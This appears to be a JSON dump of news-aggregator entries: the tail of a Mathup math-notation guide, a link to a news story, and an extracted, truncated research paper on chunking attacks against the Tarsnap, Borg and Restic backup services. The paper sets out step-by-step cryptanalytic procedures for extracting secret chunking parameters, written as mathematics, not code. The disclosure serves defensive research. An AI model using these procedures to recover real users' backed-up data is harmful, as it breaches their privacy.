ZZ:   p/q}\n\n                  P(A  |  B) = P(B  |  A)P(A) / P(B)\n\n          Fractions\n\n            In MathML you enclose fractions in an\n            <mfrac> element. In Mathup you simply separate\n            the numerator a and the denominator\n            b with a slash (a/b).\n\n            Mathup tries to be smart about what you mean as numerator and\n            denominator by looking at the spaces you surround your\n            subexpressions with, so\n            a+b / c+d is not the same thing as\n            a + b/c + d. Generally a space between the\n            subexpression and the slash will apply the entire subexpression,\n            while no space only aplies what immediately precedes or follows.\n\n              1+2 / 3+4\n              1+2/3+4\n              df = df / dx dx\n              f'(x) = dy / dx\n              f''(x) = (d^2 y) / dx^2\n\n                phi = 1+1/ 1+1/ 1+1/ 1+1/ 1+ddots\n\n          Sub and superscripts\n\n            The underscore will impose the following expression as a subscript\n            on the preceding expression (a_i ⇒\n\n              ai ), the ascii caret will impose a superscript (a^2 ⇒\n\n              a2 ), and the (expression, underscore, caret) / (experssion, caret,\n            underscore) sequence (a_i^2/a^2_i) will\n            impose a sub and superscript on the first expression yielding\n\n                a\n                i\n                2\n               .\n\n            Over and underscripts follow a similar pattern exept with\n            ._ for underscripts and .^ for\n            overscripts. Also lim_x will put x as an\n            underscript, and sum_a^b and prod_a^b will\n            put a and b as under and\n            overscripts.\n\n            Unlike fractions, sub/super and under/overscripts are\n            right-associative\n            and take precedence over fractions. You can strategically place\n            whitespace between the sub/sup, or under/over character and the\n            surrounding sub expressions just like with fractions, e.g.\n            e^ -1/2 yields\n\n                e\n\n                  −\n\n                    1\n                    2\n\n            , while e^ -1 / 2 yields\n\n                  e\n                  −1\n\n                2\n\n            .\n\n              2^2^2^2\n              a^2/b^2\n              e^ -1/x\n              a^2 + b^2 = c^2\n\n              ln x = int_1^x 1/t dt\n\n                  (X^T)_(ij) = X_(ji),    X._(n xx m) <=> (X^T)._(m xx n)\n\n                  phi =.^\"def\" a/b = a+b / a\n\n                  obrace(x + ... + x).^(k   \"times\")\n\n          Fenced Groups\n\n            We can use parenthesis to group terms together. An any unicode open\n            parenthesis (unicode category Ps) starts a fence, and\n            any closing parenthesis (category Pe) closes it. Note\n            that parenthesis don’t have to match, but they do have to come in\n            open/close pairs.\n\n            You denote an unfenced group with {: and\n            :}. You are free to surround the contents of the\n            unfenced group with arbitrary operators and the will become the new\n            fence. For example if you need an open parenthesis to close a group,\n            you can cast them to operators and manually fence the group like so:\n\n            \\]{: a, b :}\\[ ⇒\n\n                ]\n                a,b\n                [\n               .\n\n            Finally, inside groups—along with your normal seperators like\n            ,—you can use the special :|: as group\n            separators. This is especially handy to write\n            bra-ket notation:\n\n            (: Phi :|: Psi :) ⇒\n            ⟨Φ|Ψ⟩.\n\n            Additional fences\n\n              {:a, b:}\n\n                    a\n                    ,\n                    b\n\n              (:a:|:b:)\n\n                    ⟨\n\n                      a\n                      |\n                      b\n\n                    ⟩\n\n              <<a, b>>\n\n                    ⟨\n\n                      a\n                      ,\n                      b\n\n                    ⟩\n\n              |(a, b)|\n\n                    |\n\n                      a\n                      ,\n                      b\n\n                    |\n\n              |:a, b:|\n\n                    |\n\n                      a\n                      ,\n                      b\n\n                    |\n\n              ||(a, b)||\n\n                    ∥\n\n                      a\n                      ,\n                      b\n\n                    ∥\n\n              ||:a, b:||\n\n                    ∥\n\n                      a\n                      ,\n                      b\n\n                    ∥\n\n              |~x~|\n\n                    ⌈\n                    x\n                    ⌉\n\n              |__x__|\n\n                    ⌊\n                    x\n                    ⌋\n\n            Additional fenced shortcuts\n\n              binom(a, b)\n\n                    (\n\n                      a\n                      b\n\n                    )\n\n              abs x\n\n                    |\n                    x\n                    |\n\n              norm x\n\n                    ∥\n                    x\n                    ∥\n\n              ceil x\n\n                    ⌈\n                    x\n                    ⌉\n\n              floor x\n\n                    ⌊\n                    x\n                    ⌋\n\n                binom(n, k) = n! / k!(n-k)!\n\n              P(X :|: mu, sigma)\n\n              a //{: b/c :}// d\n\n                  {x ∈ X :  a < x < b} = \\]{: a, b :}\\[\n\n                  F = {:(del f) / (del x):|_(hat x)_(k-1)\n\n                 |:Psi(t):) = int Psi(x, t) |:x:) dx\n\n                  <<V(t)^2>> = lim_(T->oo) 1/T int_(-T/2)^(T/2) V(t)^2 dt\n\n          Matrices\n\n            Matrices are fenced groups with at least one row separator\n            (;) For example\n            A = [1,2,3; 4,5,6] is a 2×3 matrix and\n            [1,4; 2,5; 3,6] is\n\n                A\n                T\n               . A trailing row break is allowed so you can write a single row\n            matrix as [1,2,3;]. A new-line character can also be\n            used as a row separator.\n\n            All this does is put the outer brackets as a fence around the table\n            inside, so if you want case assignment you can write:\n\n          |x| = { x, if x >= 0 ; -x, otherwise :}\n\n              {: a, b; c, d :}\n              {: \\] {:a, b; c, d:} \\[ :}\n\n[λ_0, λ_1, ...;] [p_(0 0), p_(0 1), ...\n                  p_(1 0), p_(1 1), ...\n                  vdots,   vdots,   ddots]\n\n              1 / ad-bc [d, -b; -c, a]\n\n                  ||bf x||^2 = [x_1; x_2; x_3] * [x_1; x_2; x_3]\n\nn! = { 1,       if n=0 or n=1\n       n(n-1)!, if n > 1\n\n                  det A = |(a, b; c, d)| = ad - bc\n\n          Tensors and Indices\n\n            To write tensors or any other complex indices you can start a group\n            with either a hat ^ or an underscore\n            _ character. The following expression will be your first\n            upper or lower index respectively. Every following ^ or\n            _ will start a new index A(^b_c) for\n\n                A cb\n               . If you want your index on a new column you can add a\n            , before the ^ or _:\n            A(^b,_c)\n\n                A b c\n               . You can repeat the previous index position by omitting the\n            ^ or _ after a comma:\n            A(_b,c,d,^e,f,g)\n\n                A b c\n                d e f g\n               .\n\n            You can also add prescripts by immediately following with an\n            expression. [^14_6]rm C\n\n                C  614\n\n            or both (^n)P(_k)\n\n                P k  n\n               . Prescripts take priority.\n\n            If you want to add sub- or superscripts to your indices, you can\n            surround the entire index with parenthesis\n            A(^(a_i),...,(a_n)) ⇒\n\n                A ai\n                …\n                an\n               . And if you want to use a comma or a parenthesis as an index, you\n            can escape it with a backslash \\\n            A(_beta, \\,, \\[, a)\n\n                A β,\n                [a\n               .\n\n              (^a_b^c_d)E(^f_g^h_i)\n              (_a,^b,_c,^d)E(^f,_g,^h,_i)\n              Gamma(^mu, _nu, _rho)\n\n                  delta(^\\[ ^(alpha_1)_(beta_1)) ... delta(^(alpha_p)_(beta_p) ^\\])\n\n                  (bf it B')(^i,_j) = sum_k sum_l bf it B(^k,_l) delta(^i,l) delta(_k,j)\n\n          Roots\n\n            MathML has <msqrt> and\n            <mroot> tags for roots. Mathup similarly provides\n            sqrt x and root n x (or\n            root(n, x) if you prefer) for the squared root of\n            x and the n-th root of x respectively.\n\n              phi = 1+sqrt5 / 2\n\n                  x = -b+-sqrt(b^2 - 4ac) / 2a\n\n                  rho = (root(3, 108 + 12 sqrt 69) + root(3, 108 - 12 sqrt 69)) / 6\n\n                  sqrt 1+sqrt 1+sqrt 1+sqrt 1+sqrt 1+sqrt 1+sqrt 1+cdots\n\n          Accents\n\n            The following commands will add accents over or under the following\n            expression or add other types of highlighting:\n\n            Accents\n\n              hat a\n\n                  a^\n\n              bar a\n\n                  a‾\n\n              vec a\n\n                  a→\n\n              dot a\n\n                  a⋅\n\n              ddot a\n\n                  a⋅⋅\n\n              tilde a\n\n                  a˜\n\n              ul a\n\n                  a_\n\n              oparen a+b\n\n                    a+b\n                    ⏜\n\n              uparen a+b\n\n                    a+b\n                    ⏝\n\n              obrace a+b\n\n                    a+b\n                    ⏞\n\n              ubrace a+b\n\n                    a+b\n                    ⏟\n\n              obracket a+b\n\n                    a+b\n                    ⎴\n\n              ubracket a+b\n\n                    a+b\n                    ⎵\n\n              oshell a+b\n\n                    a+b\n                    ⏠\n\n              ushell a+b\n\n                    a+b\n                    ⏡\n\n              cancel a+b\n\n                    a+b\n\n                  bar x = 1/n sum_(i=0)^n x_i\n\n                  vec x = a hat i + b hat j + c hat k\n\n              X -> x + tilde x\n\n                  oparen a+b uparen c+d oshell e+f ushell g+h obracket i+j ubracket k+l\n\n          Font commands\n\n            You can prefix any expression with a font command. Then all token\n            elements in that expression will have the following variant. Some\n            variants can be combined, order doesn’t matter.\n\n            Bold (bf), italic (it), sans-serif\n            (sf), and monospace (tt) on texts (bf tt \"text\") are set using CSS. If you want to control the font-family of\n            sans-serif and monospace texts, you can set the\n            CSS custom properties\n            --mathup-font-family-sans-serif and\n            --mathup-font-family-monospace\n            respectively.\n\n            Font Commands\n\n              rm\n\n                  normal\n\n              bf\n\n                  bold\n\n              it\n\n                  italic\n\n              bf it\n\n                  bold italic\n\n              bb\n\n                  𝕕𝕠𝕦𝕓𝕝𝕖-𝕤𝕥𝕣𝕦𝕔𝕜\n\n              cc\n\n                  𝓈𝒸𝓇𝒾𝓅𝓉\n\n              bf cc\n\n                  𝓼𝓬𝓻𝓲𝓹𝓽\n\n              fr\n\n                  𝔣𝔯𝔞𝔠𝔱𝔲𝔯\n\n              bf fr\n\n                  𝖋𝖗𝖆𝖈𝖙𝖚𝖗\n\n              sf\n\n                  𝗌𝖺𝗇𝗌-𝗌𝖾𝗋𝗂𝖿\n\n              bf sf\n\n                  𝘀𝗮𝗻𝘀-𝘀𝗲𝗿𝗶𝗳\n\n              it sf\n\n                  𝘴𝘢𝘯𝘴-𝘴𝘦𝘳𝘪𝘧\n\n              bf it sf\n\n                  𝙨𝙖𝙣𝙨-𝙨𝙚𝙧𝙞𝙛\n\n              tt\n\n                  𝚖𝚘𝚗𝚘𝚜𝚙𝚊𝚌𝚎\n\n                  bb`1`_({x in X})\n\n                  it`proj`_(bf v) bf a = (bf a*v) / (norm(bf v)^2) bf v\n\n                  bb E[X] = int_(-oo)^oo x f(x) bb it \\d x\n\n          Colors\n\n            You can change the color or background of a portion of your\n            experssion simply by typing that color. Backgrounds are prefixed by\n            bg.<colorname>. If you don’t like that color\n            variant, you can overwrite it using the\n            --mathup-color-<colorname> or\n            --mathup-background-<colorname>\n            CSS custom properties. For example:\n\n            If you have an emoji keyboard you can use the colored circle emoji\n            (🔴🟠🟡🟢🔵🟣🟤) for color and the colored square emoji\n            (🟥🟧🟨🟩🟦🟪🟫) for the background. Black and white circles use the\n            medium variant (⚫⚪), and black and white square use the large\n            variant (⬛⬜).\n\n          :root {\n  --mathup-color-red: lch(50% 130 20);\n  --mathup-background-green: lch(50% 132 180);\n}\n\n          See below for available colors\n\n            Colors\n\n              red, 🔴\n\n                Red\n\n              orange, 🟠\n\n                Orange\n\n              yellow, 🟡\n\n                Yellow\n\n              green, 🟢\n\n                Green\n\n              cyan\n\n                Cyan\n\n              blue, 🔵\n\n                Blue\n\n              purple, 🟣\n\n                Purple\n\n              brown, 🟤\n\n                Brown\n\n              black, ⚫\n\n                Black\n\n              gray\n\n                Gray\n\n              lightgray\n\n                Lightgray\n\n              white, ⚪\n\n                White\n\n            Backgrounds\n\n              bg.red, 🟥\n\n                Red\n\n              bg.orange, 🟧\n\n                Orange\n\n              bg.yellow, 🟨\n\n                Yellow\n\n              bg.green, 🟩\n\n                Green\n\n              bg.cyan\n\n                Cyan\n\n              bg.blue, 🟦\n\n                Blue\n\n              bg.purple, 🟪\n\n                Purple\n\n              brown, 🟫\n\n                Brown\n\n              bg.black, ⬛\n\n                Black\n\n              bg.gray\n\n                Gray\n\n              bg.lightgray\n\n                Lightgray\n\n              bg.white, ⬜\n\n                White\n\n                cancel red 1+1\n\n                🟥⚪bf A + 🟦⚪bf B\n\n                bg.black white norm bf a\n\n                { a - -b, bg.lightgray tt\"a - -b\"\n  a - it`−b`, bg.lightgray tt\"a - it`−b`\"\n\n                  \"🫶\" = 🟥♥🟧♥🟨♥🟩⚪♥🟦⚪♥🟪⚪♥",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "ea4cc79d54187c2b",
    "title": {
      "en": "Big Tech is striking secret deals to make you foot its electricity bill",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://web.archive.org/web/20250314114652/https://www.businessinsider.com/big-tech-secret-energy-deals-utility-bills-cost-consumers-2025-3",
    "score": 26,
    "by": "zekrioca",
    "time": 1742716652,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "80d26d5aa7eee205",
    "title": {
      "en": "Chunking Attacks on File Backup Services Using Content-Deﬁned Chunking [pdf]",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.daemonology.net/blog/chunking-attacks.pdf",
    "score": 116,
    "by": "cperciva",
    "time": 1742578234,
    "content": "Chunking Attacks on File Backup Services using Content-Defined Chunking  Boris Alexeev Colin Percival Tarsnap Backup Inc. Yan X Zhang San José State University March 2025  Abstract  Systems such as file backup services often use   content-defined chunking   (CDC) algorithms, especially those based on   rolling hash   techniques, to split files into chunks in a way that allows for data deduplication. These chunking algorithms often depend on per-user parameters in an attempt to avoid leaking information about the data being stored. We present attacks to extract these chunking parameters and discuss protocol-agnostic attacks and loss of security once the parameters are breached (including when these parameters are not setup at all, which is often available as an option). Our parameter-extraction attacks themselves are protocol-specific but their ideas are generalizable to many potential CDC schemes.  1   Introduction  Online file backup services are one of several related applications that involving storing and manip- ulating large amounts of changing data. One useful feature of such a service is   deduplication : if the same file is uploaded more than once, then perhaps storing it the second time should be relatively cheap.[12] Such a system is even more useful if uploading a slightly-modified file also resulted in cost savings, and luckily this is possible using the clever idea of   content-defined chunking   (CDC). Some file backup services advertise the further feature that the backup service itself cannot read the user’s data.   This causes some tension with respect to the deduplication feature:   how can the service deduplicate data without being able to see it? There is not yet a universally-used solution to this problem, so each backup service tends to implement their own method of performing content-defined chunking using user-specific secret keys. In this paper, we discuss some methods of attacking these schemes in order to extract the secret keys and then use this information to recover some of the user’s data.   There are also interesting interactions with another common feature of backup services:   compression . 1\n\nWe begin by defining a   chunking   scheme as an algorithm where: • The input is a string   S   of   characters   taking the form   b 1 b 2 b 3   · · ·   , where each character   b i   is an element of some   alphabet   set   B . For example, if the   b i ’s are bytes (as is typical for our use cases), then we can consider   B   =   { 0 , . . . ,   255 } .  • The output is a list of   chunks   C 1 , C 2 , . . . , which are themselves lists of characters, such that  S   =   C 1 || C 2 || C 3 || · · ·   where   ||   denotes concatenation. We say that   S   chunked at   position   j   (or equivalently,   j   is a   breakpoint ) if   b j   is the last character in some   C i . Content-defined chunking schemes are chunking schemes where the breakpoints are determined by the content of the surrounding data (typically the data immediately preceding the breakpoint). An archetypal application of CDC is for a data backup service: if a server is storing data for a user, then CDC enables a slight update of the data to only affect a small number of chunks near the edit, whereas a more naive chunking scheme might not.   For example, if the chunking scheme simply divided the data into fixed chunk sizes, then any edit that changes the length of the document at a single place (like a one-character insertion) would require all chunks after the edit point to be remade, which might be a huge overhead requiring resending many chunks to the server.[11] We mostly restrict our attentions to CDCs that follow a   rolling hash   format (or something very similar, such as the scheme used by Tarsnap), meaning: • As (public or private) parameters, we have some ring   R , such as   Z /n Z   or   F 2 [ X ]   and some  window size   N   . Typically we want   N   to be much smaller than the average chunk size, so that two strings with small edit distance will end up being divided into mostly-identical sequences of chunks. • As we read in characters, we chunk after a string ending with   b 1   · · ·   b N   if  N ∑  i =1  g ( i ) f   ( b i )   ∈   R C   ,  for some functions   g   and   f   (usually   g   is some function that is easy to iterate, such as taking a power or multiplying by an element of some cyclic group) and some fixed subset of elements  R C   ⊂   R . When this happens, we say that there was a   clash   after   b N   . • We also chunk if the current “unchunked” part of the buffer since the last breakpoint (or the beginning of the file) has reached some maximum chunk size parameter (and/or the end of the data to be chunked).   Thus, we can think of a clash as a special case of a chunk being created that corresponds to some algebraic constraint in   R . This allows us to assume that we know (with high probability) if a chunk happened due to a clash or not by just looking at the context. Some popular examples of rolling hashes frequently used in practice are the Rabin-Karp algorithm’s rolling hash [3] (modulo some integer   n   and using   g ( i ) =   α i   for some   α ), Rabin Fingerprint [5] (working in   GF   (2) ), and Buzhash (working with cyclotomic polynomials). The reason rolling hashes are relevant to our topic is that many file backup services use variations of rolling hashes to achieve CDC. This paper will primarily look at Tarsnap [9], a project by the second author, but we will also look at other schemes such as Borg [2] and Restic [6]. Similar attacks 2\n\nmay be possible on systems making use of rsync or related tools along with   gzip --rsyncable , which resets the compression state based on a window checksum. Attacks on tools using these algorithms will generally consist of two parts: 1.   Parameter Extraction Attacks   extract the chunking algorithm’s parameters, thus turning the algorithm into a deterministic algorithm known to the attacker. These attacks are specific to the protocol and can be thought of as individual instances of decryption problems. 2.   Post-Parameter Attacks   can be performed on the user’s data after the chunking algorithm is known completely (such as after a parameter extraction attack, or in a situation where the chunking algorithm has no private information to begin with). These attacks tend to be more general and depend less on the specific chunking algorithm. In Section 3, we showcase parameter extraction attacks on Tarsnap, Borg, and Restic, which should translate into practical attacks after accounting for border cases and minor implementation details. In Section 4, we show post-parameter attacks that can theoretically happen to   any   CDC- based chunking service.  1.1   Independent work  After completing the original work underlying this paper in 2023, but before announcing it publicly in 2025, the authors learned of similar results by Truong et al.[10] While the attacks described here and there are somewhat related, the work of both groups was performed entirely independently of each other.  2   Preliminaries  2.1   Attack Model  The most powerful attacker is usually the file backup service itself. In our attack model, we assume by default that the attacker is the server (but see Subsection A.2 for alternatives). We assume that the client software is open-source so it does not do anything obviously bad, such as sending the server its chunking parameters.   The attacker’s general goal is to find out what files the user has uploaded, either now or in the future. For most of our parameter-extraction attacks, we assume   known-plaintext   (the server knows some files that the user happens to have and how those are split into chunks) or   chosen-plaintext  (the server can trick the user into uploading particular files and see how those are split) attacks. For post-parameter-extraction attacks we have a mixture of these and   passive   (the server does not need any user-specific knowledge or influence) attacks.  2.2   Information Flow and Encryption  The standard architecture taken by all of the services we consider (though different services may have different parts of this pipeline turned off and/or have different defaults) are: 1. First, the data (say a file) is   chunked   using a known CDC scheme into strings   S 1 , . . . , S n . 3\n\nFigure 1: A visualization of data flow from the client to the server. 2. The strings are (sometimes optionally)   compressed   with some known compression algorithm  χ   into   χ ( S 1 ) , . . . , χ ( S n ) . 3. The individual pieces of compressed text   χ ( S i )   are   encrypted   with some industry-strength length-preserving encryption and then sent to the server. As a consequence, we assume that the server   knows the lengths of the compressed chunks  but not their content. (Alternatively, even without access to the server, an attacker may be able to perform fine-grained traffic analysis to glean information about chunk sizes. See Subsection A.2 in the appendix for more details.) We visualize the flow of data from the client to the server as in Figure 1. In this architecture, the sequence of operations is basically “forced” by the situation: 1. Any modern (strong) encryption produces ciphertext which is effectively indistinguishable from random; consequently it is impossible to compress or usefully chunk the ciphertext if data is encrypted 1 . 2. In order for chunking to be useful, it must be possible to retrieve and decompress chunks individually; but this is only possible if the chunks are   compressed   individually, after the chunking has been performed.  2.3   Compression  Compression can be thought of in a similar way across all our parameter-extraction attacks. In our security model, we assume that the compression is with a fixed and known algorithm (such as the default one offered by the suite), which adds an overhead to our attacks. • In Tarsnap, the compression is done with zlib (compression level 9). • Borg offers different compression options, of which lz4 is the default at the time of writing.  1 We refer here, of course, to data being encrypted   at rest .   Some services encrypt data   in transit , e.g.   using TLS, but not at rest; this allows them to deduplicate data between unrelated customers, but also introduces obvious privacy concerns.  4\n\n• Restic obtained compression in August 2022, and runs its own (open-source) algorithm. [7] We call this algorithm   χ ( s ) .   It creates some ambiguity when translating compressed chunk lengths   | χ ( s ) |   to uncompressed chunk lengths   | s | .   In effect, for   known or chosen plaintext attacks , if we encounter a chunk with some compressed length   | χ ( s ) |   and   s   is known to be a prefix of a known string, we can simply try the relatively few possible values of   s . We use the constant   k   to denote the number of different possible values, or equivalently the compression factor. For attacks which rely on highly-compressible chosen plaintexts,   k   may be between   4   and   8 , while for more generic inputs, the compression rate will typically be lower (which benefits the attacker since there is less ambiguity). More specifically, for chosen plaintext attacks involving blocks of data consisting of only two distinct byte values,   k   will approach the theoretical limit of   log (256) /log (2) = 8 ; while for known plaintexts consisting of genomic data, the compression rates can range from the expected  log (256) /log (4) = 4   to a more realistic   5   (since base pairs in DNA are not entirely randomly selected from the four options). For our work, we also consider attacks on versions of the protocol without compression for two reasons.   One: it provides insight into how much security is “offered” by compression against our attacks.   Two:   not having compression is a legitimate option that certain users might choose to enable (or have already enabled!), so attacks under such contexts are also practical to study.  2.4   Random Chunking Model  Recall that   R C   is some subset of   R   that will give a clash (and thus a new chunk) when the rolling hash becomes a value inside it. For our probabilistic arguments about chunking, we assume that at each new character we get a chunk (not accounting for minimum or maximum chunk length settings) with probability   | R C   | / | R | . In this light, the set   R C   it typically chosen only with its size  | R C   |   in mind, as a method of controlling the rate of chunking. For example, a popular choice is to define   R C   to be the set of elements that when written in binary starts with some particular constant   m   number of   0 ’s, similar to Bitcoin’s proof-of-work. This would cause the average chunk length to be   2 m . For somewhat technical reasons which we discuss later, the Tarsnap chunking algorithm doesn’t exactly fit this model, though it is still useful as motivation.  3   Parameter Extraction Attacks  In this section, we show how one can extract parameters from commonly used in-production file backup systems. Recall that this means that the attacker is able to see the chunk lengths but not be able break an industry-grade encryption protocol initiated by the user’s client. By default, we typically first assume that there is no compression and then consider compression’s effects separately. Our attacks are fairly diverse, but all of them take the following outline:  General Attack Method:  1. Identify the space of chunking parameters and the rolling hash ring   R . 2. Collect clashes (with a known or chosen plaintext). Convert each clash to some math- ematical equation in   R . 5\n\n3. Search the solutions to the set of equations in some efficient manner. 4. For each potential set of parameters   P   , check it on some (different) clash and accept if the chunk sizes induced by   P   give the right chunk sizes.   We call this last step a  clash consistency check   of   P   . If the sizes are correct, accept (to reduce false positives, this part of the algorithm can be amplified by e.g. checking consistency on multiple clashes, as is standard in Monte Carlo algorithms).  3.1   Tarsnap  Tarsnap   [9] uses a version of the Rabin-Karp type of hash, although instead of waiting for a rolling hash to equal   0   in some ring   R   (in this case   R   =   Z /p Z   for some prime   p ), it waits for the running sum (with no sliding window) to equal any of the previous running sums that are sufficiently far away.   This is similar to looking at rolling hashes with many sliding window sizes simultaneously and seeing if any of them equal   0   ∈   R , though the precise details are still different for technical reasons.  Tarsnap:  Secret parameters (derived from the user’s secret key): •   p , a prime close to   2 24 ; there are   17   ≈   2 4   possible choices. •   α , a residue modulo   p   of sufficiently high multiplicative order. There are roughly   2 24  possible residues. •   x [] :   { 0 , . . . ,   255 } →   Z /p Z , a coefficient map that assigns to each possible byte some residue mod   p . This is effectively a choice of   256   random integers mod   p . Total parameter space size:   2 4   ·   2 24   ·   (2 24 ) 256   ≈   2 6172 . Chunking procedure: 1. Given any stream   S   =   b 1 b 2   · · ·   of bytes, at any place   J   compute the “running” ( not  “rolling” since there is no window) hash  y J   ( S ) =   α 1 x [ b 1 ] +   α 2 x [ b 2 ] +   · · ·   +   α J   x [ b J   ]   (mod   p ) .  2. We look for matches of this value to an earlier one. If   y K   ( S ) =   y J   ( S )   where   1   ≤   K < J , then we split at   J , producing a chunk consisting of bytes from   1   to   J . 3. We also always create a chunk if   J   hits the maximal chunk size   261120 = (2 8   −   1)   ·   2 10 . There are further caveats in the actual implementation, such as requiring the inequality   J   −   K   −  1   <   ⌊ √ 4 J   −   μ ⌋   for the constant   μ   = 2 16   (corresponding to the mean chunk size) in order to chunk 2  2 The purpose of this constraint is to produce a faster-than-exponential decay in chunk size probabilities, that is to get more “medium-sized” chunks.  6\n\nor zlib being used to compress the data. Going forward, we ignore these details (for Tarsnap but also other services) unless necessary in context. Naively, we would have to try all   2 6172   parameters combinations 3   on some generic known plain- text and see if any pass a chunking consistency check. We might have to repeat our process if the chunking consistency check is unreliable (that is, if many possible parameter sets would give the same chunk sizes). This is secure enough for practical purposes. In fact, we were unable to find any known-plaintext parameter extraction attacks on Tarsnap that rely on a totally arbitrary file.   However, we can make some progress if we assume a chosen plaintext model or if the known plaintext happens to have some desirable properties (which do occasionally occur in the wild). The main idea of our attack is to try to break the coefficient map   x []   one at a time using  small-alphabet   files, meaning files with few distinct byte values.   Suppose we generate a known small-alphabet file   s   that consists of only two distinct byte values, which we call   0   and   1   without loss of generality.   This means that the chunking locations within the file   s   depend on only four parameters:   p, α, x [0] , x [1] . Furthermore, we can make our first reduction: observe that replacing  x [0]   by   1   and   x [1]   by   x [1] /x [0]   gives the same chunking behavior; this means we can effectively just assume that   x [0] = 1   and look for   x [1]   instead. At this point, a very straightforward attack is possible:  Attack 1   (Tarsnap, naive chosen-plaintext attack) .  1. Obtain   255   clashes   C 1 , . . . , C 255 , with each   C i   from a chosen plaintext using only   0  and   i   as bytes. 2. Enumerate all possible   ( p, α, x [1])   triples. 3. Perform a clash consistency check of   ( p, α, x [0] = 1 , x [1])   on   C 1 . 4. Repeat a shortened version for all   i   = 2   through   255 . For each   i : (a) Loop over all potential   x [ i ]   (at this step,   p   and   α   are already known). (b) Perform a clash consistency check of   ( p, α,   1 , x [ i ])   on   C i . Accept if consistent. How long does this “brute force” attack take?   For   b [1] , the number of possible parameters is approximately  2 4   ×   2 24   ×   2 24   ≈   5   ·   10 15   ≈   2 52 .  Suppose our known file is one megabyte in size (this is longer than necessary; see Section 4.1 for discussion later). A naive estimate of chunking the file according to all possible parameters – but not compressing them – is on the order of   10 10   CPU-hours ( 100 000   CPU-years).   The task is “embarrassingly parallel,” so the clock time can be shortened by running on many cores.   While this attack is perhaps impractical, let us quickly upper-bound its cost: (cloud) compute can cost approximately 1 cent per 1 CPU-hour, so by another quite literal measure of cost, this is   $100  million of compute. Luckily, we do not have to repeat this workload   256   times; after   p   and   α   are known, the workload of the simplified loops are much smaller.  3 Or the   2 256   possible HMAC keys from which these parameters are generated.  7\n\nThis naive attack is still not viable, although we were doing much better than   2 6172   now. First, we reduced our search by a factor of   17   million with the “dividing out by   x [0] ” strategy. Second, our chosen-plaintext attack allows us to “divide and conquer” and reduce most of the work to just finding   x [1]  x [0]   . We now show that this direction can be made practical if we add one more ingredient: using the mathematical properties of the clashes to reduce the search space. Recall that if there is a clash at position   J   (recall that this means there is a chunk after position   J   that is not caused by having hit the maximum chunk size), then we have the relationship  ∑ J − 1  i =0   x [ s i ] α i   ≡   ∑ K − 1  i =0   x [ s i ] α i   (mod   p ) , which may be simplified to   ∑ J − 1  i = K   x [ s i ] α i   ≡   0 (mod   p )   and further to   d − 1 ∑  i =0  x [ s J − d + i ] α i   ≡   0   (mod   p )  where   d   =   J   −   K . In such a situation, let us call the substring   s K   s K +1   · · ·   s J   that caused the hash collision a   clash string   (of length   d ). Suppose we knew the first uncompressed chunk size   J   exactly.   Assuming that this chunk came from a clash, we have a constraint relating   α   and   x [1]   modulo   p .   Specifically, we have  ∑ J − 1  i = J − d   x [ s i ] α i   ≡   0 (mod   p )   for some clash length   d .   For each specific value of   d , we have an explicit polynomial relationship for   α   and   x [1]   roughly of the form   ∑  i   x [ s i ] α i   ≡   0 (mod   p ) , where we elide the range of the   i   and simplify some exponents for the sake of exposition.   We can now separate this as   ∑  s i =0   x [0] α i   +   ∑  s i =1   x [1] α i   ≡   0 (mod   p ) , or rewriting,  x [1] /x [0]   ≡   x [1]   ≡ −  ∑  s i =0   α i  ∑  s i =1   α i   (mod   p ) .   (3.1) In particular, if we knew the values   J   and   d   (and of course the string   s ), then   α   determines   x [1]  x [0]  uniquely. This allows the following attack:  Attack 2   (Tarsnap, using clashes) .  1. Input:   255   long strings with the   i -th string having only   0   and   i   as bytes for   i   ∈ { 1 , . . . ,   255 } . 2. From the   i th string, obtain two clashes   C i   and   C ′  i . This gives   510   clashes   C 1 , . . . , C 255  and   C ′  1 , . . . , C ′  255 , with   C i   and   C ′  i   using only   0   and   i   as bytes. 3. Enumerate all possible   ( p, α, d )   triples. 4. Compute the uniquely determined value of   x [1]   as in Equation 3.1 for both clash   C 1  and clash   C ′  1 . 5. Determine   ( p, α, x [1])   by finding the overlap in the two lists obtained in the previous step. 6. Repeat a shortened version for all   i   = 2   through   255 . For each   i : (a) For each   d   (at this step,   p   and   α   are already known), compute the uniquely determined   x [ i ]   from the clash   C i . (b) Perform a clash consistency check of   ( p, α,   1 , x [ i ])   on   C ′  i . Accept if consistent. 8\n\nOn average, the constraint on   d   allows for   400   possible values 4 . This means we are looping over  2 4   ·   2 24   ·   2 9   ≈   2 37   sets of parameters; each parameter has an amortized cost of only a few operations since each of the sums in Equation 3.1 can be reused in computing the sums for the next higher value of   d . Compression makes the situation a bit harder for the attack, but not overwhelmingly; on average for a file containing two distinct byte values, knowing the compressed chunk size allows approximately   k   = 8   possible uncompressed chunk sizes and thus   8   possible   ending   points in addition to the   ≈   400   possible   starting   points. This results in an attack taking a few hundred CPU-hours; but the same considerations about parallelism from before apply here as well, so the attack can complete in under an hour given a few hundred CPU cores.  3.2   Borg  Borg   [2] uses Buzhash in \"buzhash chunker\" mode; it also provides a non-CDC \"fixed chunker\" mode that seems directly inspired by protection against the types of attacks we mention 5 .  Simplified Buzhash Chunker : Secret parameters (derived from the user’s secret key): •   x [] :   { 0 , . . . ,   255 } → { 0 ,   1 } 32 , a coefficient map that assigns to each possible byte a  32 -bit string. Total parameter space size:   (2 32 ) 255   = 2 8160 . Chunking procedure: 1. Given any stream   S   =   b 1 b 2   · · ·   of bytes, at any place   J   compute the rolling hash  y J   ( S ) =   s N   − 1 ( x [ b J − N   +1 ])   ⊕   s N   − 2 ( x [ b J − N   +2 ])   ⊕ · · · ⊕   x [ b J   ]   ∈ { 0 ,   1 } 32 ,  where   s   is the cyclic bit shift function and   ⊕   denotes XOR.   N   = 4095   is the hard-coded window length. 2. If the last   21   bits of this hash equals   0 , then we chunk at   J . 3. We also chunk if we hit the maximal chunk size of   2 23   bytes. Borg uses a   32   bit Buzhash, which runs on XOR. At first glance (this will change by Attack 4) this means that we do not have the same algebraic properties as Tarsnap (in particular, no multiplication symmetry and no particular meaning to quantities like   x [1] /x [0] ). However, since the window sizes are fixed, our search space is smaller compared to Tarsnap in this direction. In addition, we can make the problem “linear” in a way that removes the need for a “divide and conquer” approach. To start this attack, for each   i   ∈ { 0 , . . . ,   255 } , define   